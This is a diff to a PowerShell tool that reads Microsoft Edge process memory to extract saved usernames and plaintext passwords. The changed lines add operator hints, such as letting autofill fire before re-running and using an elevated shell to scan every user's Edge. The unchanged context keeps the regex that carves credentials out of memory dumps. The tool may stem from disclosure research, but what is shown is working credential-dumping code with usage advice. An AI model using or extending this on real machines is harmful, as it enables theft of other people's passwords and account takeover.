@@ -123,6 +123,16 @@ foreach ($p in $edgeProcs) {
 
 Write-Host " Done.`n"
 
+if ($processList.Count -eq 0) {
+    Write-Host '[!]' -ForegroundColor Yellow -NoNewline
+    Write-Host ' No msedge.exe root processes found.'
+    Write-Host ''
+    Write-Host '  - Open Microsoft Edge first, then re-run this script.'
+    Write-Host '  - Without admin you only see Edge processes started by your own user.'
+    Write-Host "  - To scan every user's Edge, re-run from an elevated PowerShell."
+    Write-Host ''
+}
+
 # Same patterns as the C# version. Single-quoted to avoid PS interpolation;
 # user/password are spliced in via [regex]::Escape and string concat.
 $pwPattern = '[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\-_\.@\?]{1,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40})\x20\x00'
@@ -193,3 +203,12 @@ $seenStrings.Clear()
 $seenStrings = $null
 
 Write-Host "`nTotal matches found across all processes: $totalMatches. $shownMatches shown."
+
+if ($totalMatches -eq 0 -and $processList.Count -gt 0) {
+    Write-Host ''
+    Write-Host '[!]' -ForegroundColor Yellow -NoNewline
+    Write-Host " 0 matches across $($processList.Count) Edge process(es)."
+    Write-Host '  Credentials only land in memory AFTER an autofill triggers.'
+    Write-Host '  Visit a site with a saved password, let Edge autofill once,'
+    Write-Host '  then re-run WITHOUT closing/restarting Edge.'
+}
